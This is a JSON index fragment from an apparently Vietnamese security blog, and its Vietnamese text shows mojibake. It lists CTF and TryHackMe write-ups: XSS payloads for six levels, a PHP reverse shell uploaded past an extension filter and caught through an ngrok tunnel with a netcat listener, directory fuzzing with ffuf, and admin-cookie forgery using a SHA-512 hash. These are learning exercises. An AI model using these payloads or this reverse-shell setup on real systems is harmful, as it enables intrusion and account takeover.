b·∫•t k√¨ h·ªá th·ªëng n√†o :^ ). ƒê·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ m·ªçi ng∆∞·ªùi tham gia v√†o ph√°t tri·ªÉn trang web ƒë·ªÅu nh·∫≠n th·ª©c ƒë∆∞·ª£c th√¥ng tin n√†o l√† th√¥ng tin nh·∫°y c·∫£m. ƒê√¥i khi nh·ªØng th√¥ng tin t∆∞·ªüng ch·ª´ng r·∫•t ƒë∆°n gi·∫£n nh∆∞ng l·∫°i c·ª±c k√¨ h·ªØu √≠ch cho k·∫ª t·∫•n c√¥ng :^ S·ª≠ d·ª•ng nh·ªØng th√¥ng b√°o chung c√†ng nhi·ªÅu c√†ng t·ªët, kh√¥ng cung c·∫•p b·∫•t k√¨ ‚Äúhint‚Äù n√†o cho k·∫ª t·∫•n c√¥ng Ki·ªÉm tra k·ªπ ƒë·ªÉ ƒë·∫£m b·∫£o r·∫±ng m·ªçi t√≠nh nƒÉng g·ª° l·ªói, ch·∫©n ƒëo√°n ƒë√£ ƒë∆∞·ª£c t·∫Øt ƒê·∫£m b·∫£o hi·ªÉu ƒë·∫ßy ƒë·ªß c√°ch c·∫•u h√¨nh v√† √Ω nghƒ©a b·∫£o m·∫≠t c·ªßa b·∫•t k·ª≥ c√¥ng ngh·ªá b√™n th·ª© ba n√†o m√† b·∫°n tri·ªÉn khai. D√†nh th·ªùi gian ƒë·ªÉ t√¨m hi·ªÉu v√† t·∫Øt b·∫•t k·ª≥ t√≠nh nƒÉng v√† c√†i ƒë·∫∑t n√†o m√† b·∫°n kh√¥ng th·ª±c s·ª± c·∫ßn." }, { "title": "XSS level m·∫´u gi√°o xD", "url": "/posts/XSSBasic/", "categories": "Writeup, tryhackme", "tags": "web, writeup", "date": "2022-03-07 23:00:00 +0800", "snippet": "XSS level m·∫´u gi√°o xDWriteup c·ªßa m√¨nh v·ªÅ 1 b√†i tr√™n tryhackme.com, g·ªìm 6 levelLevel 1Xem qua trang webNh·∫≠p t√™n v√†o √¥ input, t√™n nh·∫≠p v√†o s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã v·ªõi c√¢u ch√†oSource codeNh·∫≠p&lt;script&gt;alert(\"THM\")&lt;/script&gt;V√† qua ƒë∆∞·ª£c level 1Level 2Chu·ªói nh·∫≠p v√†o s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã trong 1 √¥ inputXem qua source code, ta th·∫•y gi√° tr·ªã nh·∫≠p v√†o ƒë∆∞·ª£c ch√®n v√†o thu·ªôc t√≠nh value c·ªßa th·∫ª inputPayload ƒë·ªÉ bypass v·ªõi d·∫•u ‚Äú v√† &gt; ƒë·ªÉ ƒë√≥ng th·∫ª input\"&gt;&lt;script&gt;alert(\"THM\")&lt;/script&gt;Level 3L·∫ßn n√†y ƒë·∫ßu v√†o ƒë∆∞·ª£c cho v√†o 1 textareaSource codePayload t∆∞∆°ng t·ª± nh∆∞ tr√™n, l·∫ßn n√†y ƒë√≥ng th·∫ª textarea r·ªìi ch√®n c·∫∑p th·∫ª script&lt;/textarea&gt;&lt;script&gt;alert(\"THM\")&lt;/script&gt;Level 4L·∫ßn n√†y chu·ªói nh·∫≠p v√†o ƒë∆∞·ª£c hi·ªán th·ªã t∆∞∆°ng t·ª± Level 1Check th·ª≠ source codeTa th·∫•y c√≥ 1 ƒëo·∫°n javascript th·ª±c hi·ªán vi·ªác l·∫•y ph·∫ßn t·ª≠ c√≥ class name l√† ‚Äúname‚Äù v√† thi·∫øt l·∫≠p n·ªôi dung cho n√≥ l√† n·ªôi dung ng∆∞·ªùi d√πng nh·∫≠p v√†oS·ª≠ d·ª•ng m·ªôt d·∫•u nh√°y ( ‚Äò ) v√† d·∫•u ch·∫•m ph·∫©y ƒë·ªÉ tho√°t kh·ªèi c√¢u l·ªánh hi·ªán t·∫°i, sau ƒë√≥ ƒë√≥ng lu√¥n th·∫ª script';&lt;/script&gt;&lt;script&gt;alert(\"THM\")&lt;/script&gt;Level 5Chu·ªói nh·∫≠p v√†o s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ngay d∆∞·ªõiXem qua source codeCh√®n th·ª≠ 1 ƒëo·∫°n script ƒë∆°n gi·∫£nTa th·∫•y t·ª´ ‚Äúscript‚Äù ƒë√£ b·ªã l·ªçc kh·ªèi inputNh∆∞ng th·ª≠ vi·∫øt hoa th√¨ kh√¥ng b·ªã filterTa c√≥ payload&lt;SCRIPT&gt;alert(\"THM\")&lt;/SCRIPT&gt;Level 6Ta nh·∫≠p ƒë∆∞·ªùng d·∫´n ·∫£nh v√† ·∫£nh s·∫Ω ƒë∆∞·ª£c hi·ªán th·ªã ph√≠a d∆∞·ªõiXem qua source codeTa c√≥ payload\" onerror=\"alert('THM')\"" }, { "title": "TestAgain", "url": "/posts/TestAgain/", "categories": "General, Test", "tags": "hello", "date": "2021-10-22 23:00:00 +0800", "snippet": "Finally, it works xDDIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comebackIt‚Äôs time to comeback" }, { "title": "UMassCTF'21 - Web - heim Writeup", "url": "/posts/UMassCTFWriteUp2/", "categories": "Writeup, UMassCTF'21", "tags": "web, writeup", "date": "2021-03-29 07:00:00 +0800", "snippet": "UMassCTF‚Äô21 - Web - heimGiao di·ªán c·ªßa trang webM√¨nh th·ª≠ nh·∫≠p 1 c√°i t√™n b·∫•t k√¨ v√† ·∫•n enterOkay, m√¨nh ƒë∆∞·ª£c c·∫•p 1 access token, nh∆∞ng ƒë·ªÉ l√†m g√¨ th√¨ kh√¥ng ai n√≥i :^(M√¨nh th·ª≠ fuzz trang web ƒë·ªÉ t√¨m c√°c th∆∞ m·ª•c con/file trong trang web b·∫±ng ffuf. Chi ti·∫øt nh∆∞ n√†o c√°c b·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu th√™m t·∫°i ƒë√¢y Fuzzing web v·ªõi FFUF. Th·ª±c ra c√≥ nhi·ªÅu c√°ch ƒë·ªÉ l√†m vi·ªác n√†y nh∆∞ dirbuster, dirsearch, . . . nh∆∞ng m√¨nh v·ª´a h·ªçc tr√™n hackthebox academy c√°ch n√†y n√™n mu·ªën th·ª≠ :^.ffuf -u http://104.197.195.221:8081/FUZZ -w directory-list-2.3-medium.txtNgon l√†nh :^Truy c·∫≠p ƒë∆∞·ªùng link nh∆∞ng . . .C√≥ l·∫Ω ƒë√¢y l√† l√∫c m√¨nh d√πng access token ƒë∆∞·ª£c c·∫•p :^ Loay hoay 1 h·ªìi cu·ªëi c√πng m√¨nh d√πng curlV√† n√≥ b√°o token h·∫øt h·∫°n =)) Ch·∫Øc t·∫°i m√¨nh google h∆°i l√¢uL·∫•y 1 access token m·ªõi v√† th·ª≠ l·∫°i th√¨ m√¨nh nh·∫≠n ƒë∆∞·ª£cOke, m√¨nh kh√¥ng x·ª©ng ƒë√°ng, ch·ªâ c√≥ Odin m·ªõi c√≥ th·ªÉ xem flag xDV√† nh√¢n danh b·ªô r√¢u c·ªßa Odin, m√¨nh g√µ t√™n Odin ƒë·ªÉ l·∫•y access token :^Doneeeeee, flag l√† g√¨ th√¨ m√¨nh v·∫´n kh√¥ng n√≥i nh√© (¬¨‚Äø¬¨)" }, { "title": "UMassCTF'21 - Web - Hermit-Part 1 Writeup", "url": "/posts/UMassCTFWriteUp/", "categories": "Writeup, UMassCTF'21", "tags": "web, writeup", "date": "2021-03-29 07:00:00 +0800", "snippet": "UMassCTF‚Äô21 - Web - Hermit-Part 1Truy c·∫≠p v√†o trang web b·∫±ng 1 trong 2 link, ƒë√¢y l√† giao di·ªán c·ªßa trang web:Nh√¨n qua th√¨ m√¨nh kh√° ch·∫Øc ƒë√¢y l√† File Upload Attacks, ch√∫ng ta s·∫Ω ph·∫£i upload file reverse shell l√™n webserver. Theo k·∫øt qu·∫£ c·ªßa Wappalyzer m√¨nh bi·∫øt ƒë∆∞·ª£c r·∫±ng h·ªá th·ªëng c·ªßa web ƒë∆∞·ª£c code b·∫±ng PHPV·∫≠y n·∫øu ch√∫ng ta c√≥ th·ªÉ upload 1 file reverse shell ƒë∆∞·ª£c vi·∫øt b·∫±ng PHP l√™n, t√¨m n∆°i ch·ª©a file ƒë√≥ v√† ch·∫°y ƒë∆∞·ª£c file, ch√∫ng ta s·∫Ω c√≥ reverse shell. B·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu th√™m v·ªÅ reverse shell ·ªü ƒë√¢y. M√¨nh ch·ªâ gi·ªõi thi·ªáu b√†i vi·∫øt b·∫±ng ti·∫øng Vi·ªát v√¨ ti·∫øng Anh google c√°i ra r·∫•t nhi·ªÅu xD. T·∫•t nhi√™n m√¨nh v·∫´n khuy·∫øn kh√≠ch c√°c b·∫°n ƒë·ªçc t√†i li·ªáu ti·∫øng Anh.Okay, quay l·∫°i ch·ªß ƒë·ªÅ ch√≠nh, m√¨nh s·ª≠ d·ª•ng reverse shell php ·ªü ƒë√¢yƒê√¢y l√† l√∫c m√¨nh nh·∫≠n ra th·ª±c t·∫ø v√† nh·ªØng b√†i m√¨nh l√†m tr√™n Tryhackme hay hackthebox kh√°c ho√†n to√†n. ·ªû Tryhackme hay hackthebox m√°y b·∫°n v√† m√°y c·∫ßn t·∫ßn c√¥ng n·∫±m trong c√πng 1 m·∫°ng, vi·ªác t·∫•n c√¥ng c√≥ th·ªÉ d·ªÖ d√†ng h∆°n xD. C√≤n ·ªü ƒë√¢y th√¨ kh√°c ho√†n to√†n. M√¨nh loay hoay 1 h·ªìi r·ªìi nh·ªõ ra ngrok. Ngrok l√† c√¥ng c·ª• t·∫°o ƒë∆∞·ªùng h·∫ßm (tunnel) gi·ªØa localhost c·ªßa b·∫°n v√† internet, gi√∫p ng∆∞·ªùi kh√°c c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c localhost th√¥ng qua custom domain c·ªßa ngrok.C√†i ƒë·∫∑t ngrok v√† m·ªü 1 c·ªïng v·ªõi giao th·ª©c TCP./ngrok tcp 666M·ªü c·ªïng 666 v·ªõi giao th·ª©c TCP, m·ªü th√†nh c√¥ng s·∫Ω hi·ªÉn th·ªã nh∆∞ sauSau ƒë√≥ m·ªü port 666 ƒë·ªÉ ‚Äúnghe‚Äù v·ªõi netcatnc -lvnp 666Xong xu√¥i h·∫øt, vi·ªác cu·ªëi c√πng l√† ch·ªânh s·ª≠a file php reverse shellC√≥ 2 gi√° tr·ªã ·ªü ƒë√¢y c·∫ßn thay ƒë·ªïi, ƒë√≥ l√† ip v√† portPort l√† c·ªïng m√¨nh ƒë√£ m·ªü ·ªü tr√™n, c√≤n ip l√† 2.tcp.ngrok.io (Gi√° tr·ªã c·ªßa tr∆∞·ªùng Forwarding trong th√¥ng b√°o c·ªßa ngrok ·ªü tr√™n)Ch·ªânh s·ª≠a xong xu√¥i, vi·ªác ti·∫øp theo l√† upload file l√™n, v√† oops :^(C√≥ th·ªÉ th·∫•y webserver ƒë√£ ch·∫∑n kh√¥ng cho m√¨nh upload file ƒëu√¥i php l√™n, nicetry :^. M√¨nh th·ª≠ bypass filter ƒë·∫•y b·∫±ng c√°ch th√™m ƒëu√¥i .jpg v√†o v√† tr√¥ng n√≥ s·∫Ω nh∆∞ th·∫ø n√†y xDOkay, th·ª≠ upload l·∫°i v√† m√¨nh ƒë√£ upload th√†nh c√¥ngClick v√†o See Image v√† m√¨nh l·∫•y ƒë∆∞·ª£c reverse shellOkay, theo kinh nghi·ªám ch∆°i m·∫•y room tr√™n tryhackme, m√¨nh t√¨m th·ª≠ trong th∆∞ m·ª•c home ƒë·∫ßu ti√™nB∆∞·ªõc cu·ªëi :))Ngo√†i l·ªÅ t√Ω, m√¨nh c√≥ ƒë·ªÉ l·∫°i l·ªùi nh·∫Øn v√† c√≥ 1 √¥ng n√†o ƒë√≥ ƒë√°p l·∫°i, kh√° vui =)))) Ni·ªÅm vui nho nh·ªè trong ni·ªÅm vui to :^. Chall n√†y gi√∫p m√¨nh h·ªçc th√™m ƒë∆∞·ª£c kh√° nhi·ªÅu th·ª© xD." }, { "title": "hackthebox- misc - misDIRection Writeup", "url": "/posts/htbWriteup/", "categories": "Writeup, hackthebox", "tags": "misc, writeup", "date": "2021-03-25 21:30:00 +0800", "snippet": "hackthebox - Misc - misDIRectionLink: https://app.hackthebox.eu/challenges/55Sau khi download v√† gi·∫£i n√©n ta nh·∫≠n ƒë∆∞·ª£c 1 folder .secret nh∆∞ sauM√¨nh check th·ª≠ 1 v√†i th∆∞ m·ª•c conD√πng l·ªánh tree ƒë·ªÉ xem t·ªïng quan c·∫•u tr√∫c th∆∞ m·ª•c:Ban ƒë·∫ßu m√¨nh vi·∫øt 1 script python d√πng th∆∞ vi·ªán glob ƒë·ªÉ li·ªát k√™ h·∫øt t√™n th∆∞ m·ª•c ra v√† ƒë√¢y l√† k·∫øt qu·∫£:./0/6./1/22./1/30./2/34./5/16./9/36./B/23./C/4./D/26./E/14./F/19./F/2./F/27./J/8./N/11./N/25./N/31./N/33./R/3./R/7./S/1./U/9./V/35./X/17./X/21./X/29./d/13./e/5./j/10./j/12./p/32./s/24./u/20./u/28./x/15./z/18Sau ƒë√≥ m√¨nh th·ª≠ gh√©p c√°c ch·ªØ s·ªë ·ªü cu·ªëi th√†nh 1 d√£y s·ªë:6 22 30 34 16 36 23 4 26 14 19 2 27 8 11 25 31 33 3 7 1 9 35 17 21 29 13 5 10 12 32 24 20 28 15 18V√† sau ƒë√≥ l√† betak =)))Okay quay xe, m√¨nh xem x√©t chu·ªói kia v√† quy·∫øt ƒë·ªãnh l√†m ng∆∞·ª£c l·∫°i, nghƒ©a l√† m√¨nh s·∫Ω th·ª≠ s·∫Øp x·∫øp t√™n th∆∞ m·ª•c ·ªü ƒë·∫ßu theo th·ª© t·ª± tƒÉng d·∫ßn c·ªßa t√™n file trong th∆∞ m·ª•c (d√£y s·ªë ·ªü cu·ªëi).import globpath = './*/*'files = glob.glob(path)l = []for name in files: l.append(name[2:])dct ={}for s in l: dct[int(s.split(\"/\")[1])]=s.split(\"/\")[0]sorted_key = sorted(dct.keys())for i in sorted_key: print(dct[i],end=\"\")Sau khi ch·∫°y script s·∫Ω ƒë∆∞·ª£c 1 chu·ªói:SFRCe0RJUjNjdEx5XzFuX1BsNDFuX1NpN2V9M·ªôt th√≥i quen c·ªßa m√¨nh l√† khi th·∫•y 1 chu·ªói nh∆∞ v·∫≠y vi·ªác ƒë·∫ßu check th·ª≠ chi·ªÅu d√†i c·ªßa chu·ªói xem c√≥ chia h·∫øt cho 4 kh√¥ng, n·∫øu c√≥ kh·∫£ nƒÉng cao n√≥ l√† base64 xDDOkay, m√¨nh d√πng CyberChef gi·∫£ m√£ v√† nh·∫≠n ƒë∆∞·ª£c flag, flag l√† g√¨ th√¨ m√¨nh kh√¥ng n√≥i :^)Flag: HTB{DIR3ctLy_*************}" }, { "title": "W3Challs - Web - Authentication Writeup", "url": "/posts/w3challsWriteup/", "categories": "Writeup, W3Challs", "tags": "web, writeup", "date": "2021-03-24 20:45:00 +0800", "snippet": "W3Challs - Web - AuthenticationLink: https://w3challs.com/challenges/web/authenticationTruy c·∫≠p linkM√¨nh click th·ª≠ v√†o Administration v√† trang web b√°o l·ªói ‚ÄúForbidden Access! This part of the site is reserved to the admin!‚ÄùCheck cookie c·ªßa trang web v√† m√¨nh th·∫•y 1 cookie v·ªõi t√™n name v√† gi√° tr·ªã ‚Äúb14361404c078ffd549c03db443c3fede2f3e534d73f78f77301ed97d4a436a9fd9db05ee8b325c0ad36438b43fec8510c204fc1c1edb21d0941c00e9e2c1ce2‚ÄùS·ª≠ d·ª•ng hash-identifier ƒë·ªÉ x√°c ƒë·ªãnh ƒë·ªãnh d·∫°ng c·ªßa chu·ªói gi√° tr·ªã kia:V√† m√¨nh ƒë∆∞·ª£c k·∫øt qu·∫£:Okay, th·ª≠ crack tr√™n CrackStation ƒë∆∞·ª£c k·∫øt qu·∫£ l√† chu·ªói ‚Äúuser‚Äù :M√£ h√≥a SHA-512 cho chu·ªói ‚Äúadmin‚Äù:Sha512(admin) = c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecS·ª≠ d·ª•ng chu·ªói ƒë√£ m√£ h√≥a SHA-512 c·ªßa ‚Äúadmin‚Äù thay cho chu·ªói gi√° tr·ªã c√≥ s·∫µn v√† t·∫£i l·∫°i trang v√† l·∫•y ƒë∆∞·ª£c flag xD" }, { "title": "Hello World!!!", "url": "/posts/HelloWorld/", "categories": "General, Test", "tags": "hello", "date": "2021-03-21 23:00:00 +0800", "snippet": "Finally, it works xDDMy first post in my blog xDDDDDD. Hellooooooooooo" } ]
